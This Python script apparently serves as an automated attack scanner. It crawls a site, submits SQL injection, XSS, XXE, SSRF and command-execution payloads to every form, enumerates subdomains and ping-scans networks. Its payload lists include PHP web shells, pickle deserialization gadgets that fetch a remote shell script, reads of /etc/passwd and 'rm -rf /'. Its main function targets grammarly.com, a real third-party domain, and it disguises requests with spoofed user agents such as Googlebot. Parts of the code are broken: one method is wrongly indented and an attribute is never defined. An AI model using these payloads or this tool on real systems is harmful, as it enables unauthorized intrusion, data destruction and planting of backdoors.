import asyncio
import aiohttp
import logging
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import torch
from transformers import AutoModelForSequenceClassification, AutoTokenizer
import requests
from scapy.all import arping, sr1, IP, ICMP
import random
import dns.resolver

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Load the trained transformer model
model = AutoModelForSequenceClassification.from_pretrained("./trained_model")
tokenizer = AutoTokenizer.from_pretrained("./trained_model")

# Payloads
sql_payloads = [
    "' OR '1'='1",
    "' UNION SELECT username, password FROM users--",
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--",
    "' OR IF(1=1, SLEEP(5), 0)--",
    "'); INSERT INTO users (username, password) VALUES ('attacker', 'password');--",
    "SELECT table_name FROM information_schema.tables WHERE table_schema = 'example_db';",
    "SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'users';",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' UNION SELECT null, null, null--",
    "' UNION SELECT username, password FROM users WHERE '1'='1",
    "' UNION SELECT name, pass FROM mysql.user--",
    "' OR 1=1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--"
]

xss_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    '<a href="javascript:alert(1)">Click me</a>',
    '<math><xlink:eval>alert(1)</xlink:eval></math>',
    '<style>@import "data:text/css,&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;";</style>',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    '"><iframe src="javascript:alert(1)">',
    '"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    '"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    '"><a href="javascript:alert(1)">Click me</a>',
    '"><math><xlink:eval>alert(1)</xlink:eval></math>',
    '"><style>@import "data:text/css,&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;";</style>'
]

rce_payloads = [
    '; ls -la',
    'import pickle payload = pickle.loads(b"cos\nsystem\n(S\'ls -la\'\ntR.")',
    '{{ \'\'.__class__.__mro__[1].__subclasses__()[407](\'ls -la\', shell=True, stdout=-1).communicate()[0].strip() }}',
    'import pickle import base64 class EvilObject(object): def __reduce__(self): cmd = "rm -rf /"; return (urllib.request.urlopen, (f"http://internal-service/?cmd={base64.b64encode(cmd.encode()).decode()}",)) payload = base64.b64encode(pickle.dumps(EvilObject()))',
    '{{ \'\'.__class__.__mro__[2].__subclasses__()[40](cmd, shell=True, stdout=-1).communicate()[0].strip() }}',
    '{$output}"; } ?>',
    'startBuffering(); $phar->addFromString("test.txt", "text"); $phar->setStub(\'\'); $phar->stopBuffering(); echo "Uploaded"; ?>',
    'GET /upload.php HTTP/1.1 Content-Type: multipart/form-data; boundary=--------------------------- --------------------------- Content-Disposition: form-data; name="file"; filename="malicious.php" ---------------------------',
    'import pickle import base64 import urllib.request class EvilObject(object): def __reduce__(self): return (urllib.request.urlopen, ("http://internal-service/payload.sh",)) payload = base64.b64encode(pickle.dumps(EvilObject()))',
    '`rm -rf /`',
    '$(rm -rf /)',
    'system("ls -la")',
    '`id`',
    '$(id)',
    'system("cat /etc/passwd")',
    'eval("`id`")',
    'os.system("ls -la")',
    'os.system("cat /etc/passwd")',
    'eval("__import__(\'os\').system(\'ls -la\')")',
    '<?php system($_GET["cmd"]); ?>',
    '<?php passthru($_GET["cmd"]); ?>',
    '<?php eval($_GET["cmd"]); ?>',
    '<?php exec($_GET["cmd"]); ?>',
    '<?php shell_exec($_GET["cmd"]); ?>',
    '<?php popen($_GET["cmd"], "r"); ?>',
    '<?php $output = shell_exec($_GET["cmd"]); echo "<pre>$output</pre>"; ?>',
    '<?php $cmd = $_GET["cmd"]; $output = `$cmd`; echo "<pre>$output</pre>"; ?>',
    '<?php $cmd = $_GET["cmd"]; system($cmd); ?>',
    '<?php $cmd = $_GET["cmd"]; passthru($cmd); ?>',
    '<?php $cmd = $_GET["cmd"]; exec($cmd); ?>',
    '<?php $cmd = $_GET["cmd"]; popen($cmd, "r"); ?>',
    '<?php $cmd = $_GET["cmd"]; $output = shell_exec($cmd); echo "<pre>$output</pre>"; ?>',
    '<?php $cmd = $_GET["cmd"]; $output = `$cmd`; echo "<pre>$output</pre>"; ?>'
]

xxe_payloads = [
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/evil.xml" >]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "https://example.com/evil.dtd" >]><foo>&xxe;</foo>'
]

ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/"
]

class AdvancedCrawler:
    def __init__(self, base_url):
        self.base_url = base_url
        self.visited_urls = set()
        self.headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPad; CPU OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
            ])
        }
        self.found_vulns = []

    async def fetch(self, session, url):
        try:
            async with session.get(url, headers=self.headers, timeout=20) as response:
                if response.status == 200:
                    return await response.text()
                else:
                    logger.error(f"Error fetching {url}: {response.status}")
                    return None
        except Exception as e:
            logger.error(f"Error fetching {url}: {e}")
            return None

    async def extract_links(self, html, base_url):
        soup = BeautifulSoup(html, 'html.parser')
        for link in soup.find_all('a', href=True):
            href = link['href']
            if not urlparse(href).scheme:
                href = urljoin(base_url, href)
            full_url = urljoin(base_url, href)
            if 'grammarly' in urlparse(full_url).netloc:
                yield full_url

    async def process_url(self, url, session):
        if url not in self.visited_urls:
            self.visited_urls.add(url)
            html = await self.fetch(session, url)
            if html:
                await self.analyze_html(html, url)
                async for link in self.extract_links(html, url):
                    await self.process_url(link, session)

    async def analyze_html(self, html, url):
        soup = BeautifulSoup(html, 'html.parser')
        text = soup.get_text()
        inputs = tokenizer(text, return_tensors="pt", max_length=512, truncation=True, padding=True)
        outputs = model(**inputs)
        predictions = torch.sigmoid(outputs.logits).squeeze().tolist()
        if any(pred > 0.5 for pred in predictions):
            logger.info(f"Potential vulnerability found in {url} with predictions: {predictions}")
            self.found_vulns.append({"url": url, "predictions": predictions})

        # Check for $FLAG pattern
        if "$FLAG" in text:
            logger.info(f"$FLAG found in {url}: {text}")
            self.log_flag(url, "FLAG FOUND!")

        # Check for vulnerabilities
        self.check_vulnerabilities(soup, url)

    def log_flag(self, url, flag_status):
        with open("Found-flags.txt", "a") as f:
            f.write(f"{flag_status} at {url}\n")

    def log_vuln(self, url, vuln_type, payload, response):
        with open("Found-vulns.txt", "a") as f:
            f.write(f"{vuln_type} vulnerability found at {url} with payload: {payload}\n")
            f.write(f"Request: {payload}\n")
            f.write(f"Response: {response.text}\n\n")

    def check_vulnerabilities(self, soup, url):
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action') or url
            if not urlparse(action).scheme:
                action = urljoin(url, action)
            data = {input.get('name', ''): self.create_payload(input) for input in form.find_all('input')}
            self.check_sqli(url, action, data)
            self.check_xss(url, action, data)
            self.check_advanced_exploits(url, action, data)

    def create_payload(self, input):
        if 'text' in input.get('type', 'text'):
            return "' OR '1'='1"
        return input.get('value', '')

    def check_sqli(self, url, action, data):
        for payload in sql_payloads:
            data = {key: payload for key in data}
            response = requests.post(action, data=data, headers=self.headers)
            if response.status_code != 200 or "error" in response.text.lower():
                logger.info(f"SQL Injection vulnerability found at {url} with payload: {payload}")
                self.log_vuln(url, "SQL Injection", payload, response)

    def check_xss(self, url, action, data):
        for payload in xss_payloads:
            data = {key: payload for key in data}
            response = requests.post(action, data=data, headers=self.headers)
            if payload in response.text:
                logger.info(f"XSS vulnerability found at {url} with payload: {payload}")
                self.log_vuln(url, "XSS", payload, response)

    def check_advanced_exploits(self, url, action, data):
        advanced_payloads = {
            'xxe': xxe_payloads,
            'ssrf': ssrf_payloads,
            'rce': rce_payloads
        }
        for vuln_type, payloads in advanced_payloads.items():
            for payload in payloads:
                data = {key: payload for key in data}
                try:
                    response = requests.post(action, data=data, headers=self.headers)
                    if payload in response.text or response.status_code != 200:
                        logger.info(f"{vuln_type.upper()} vulnerability found at {url} with payload: {payload}")
                        self.log_vuln(url, vuln_type.upper(), payload, response)
                except requests.exceptions.RequestException as e:
                    logger.error(f"Error sending request to {url} with payload {payload}: {e}")

    async def crawl(self, base_url):
        async with aiohttp.ClientSession() as session:
            await self.process_url(base_url, session)

    def network_scan(self):
        for ip in arping(self.scapy_range)[0]:
            sr1(IP(dst=str(ip[1].psrc))/ICMP())
            logger.info(f"Scanned IP: {ip[1].psrc}")

    def enumerate_subdomains(self, domain):
    subdomains = []
    wordlist = ['www', 'admin', 'api', 'staging', 'dev', 'test', 'beta', 'prod', 'logs', 'analytics', 'metrics', 'monitoring', 'support', 'help', 'docs', 'wiki', 'blog', 'news', 'media', 'static', 'cdn', 'assets', 'img', 'images', 'uploads', 'download', 'ftp', 'mail', 'smtp', 'pop', 'imap', 'webmail', 'secure', 'vpn', 'remote', 'ssh', 'sftp', 'git', 'svn', 'cvs', 'hg', 'mercurial', 'bitbucket', 'github', 'gitlab', 'jenkins', 'travis', 'circleci', 'drone', 'codeship', 'heroku', 'aws', 'azure', 'gcp', 'digitalocean', 'linode', 'vultr', 'ovh', 'hetzner', 'rackspace', 'softlayer', 'cloudflare', 'fastly', 'akamai', 'incapsula', 'cloudfront', 'maxcdn', 'edgecast', 'limelight', 'level3', 'stackpath', 'cdn77', 'keycdn', 'jsdelivr', 'wpengine', 'netlify', 'vercel', 'firebase', 'shopify', 'bigcommerce', 'magento', 'woocommerce', 'prestashop', 'opencart', 'zencart', 'oscommerce', 'virtuemart', 'cubecart', 'x-cart', 'cs-cart', 'revize', 'bigcartel', 'squarespace', 'weebly', 'wix', 'godaddy', 'hostgator', 'bluehost', 'dreamhost', 'a2hosting', 'inmotion', 'siteground', 'greengeeks', 'liquidweb', 'nexcess', 'rackspace']

    # DNS brute-forcing
    resolver = dns.resolver.Resolver()
    for word in wordlist:
        subdomain = f"{word}.{domain}"
        try:
            resolver.resolve(subdomain, 'A')
            subdomains.append(subdomain)
        except dns.resolver.NXDOMAIN:
            pass

    # Virtual host discovery
    headers = {'Host': f'{{subdomain}}.{domain}'}
    for word in wordlist:
        subdomain = f"{word}.{domain}"
        headers['Host'] = subdomain
        try:
            response = requests.get(f"http://{domain}", headers=headers, timeout=5)
            if response.status_code != 404:
                subdomains.append(subdomain)
        except requests.exceptions.RequestException:
            pass

    return subdomains

def main():
    base_domain = 'grammarly.com'
    crawler = AdvancedCrawler(base_domain)
    subdomains = crawler.enumerate_subdomains(base_domain)
    for subdomain in subdomains:
        base_url = f"https://{subdomain}"
        asyncio.run(crawler.crawl(base_url))
    crawler.network_scan()

if __name__ == "__main__":
    base_url = 'https://www.example.com'
    crawler = AdvancedCrawler(base_url)
    asyncio.run(crawler.crawl(base_url))
    crawler.network_scan()
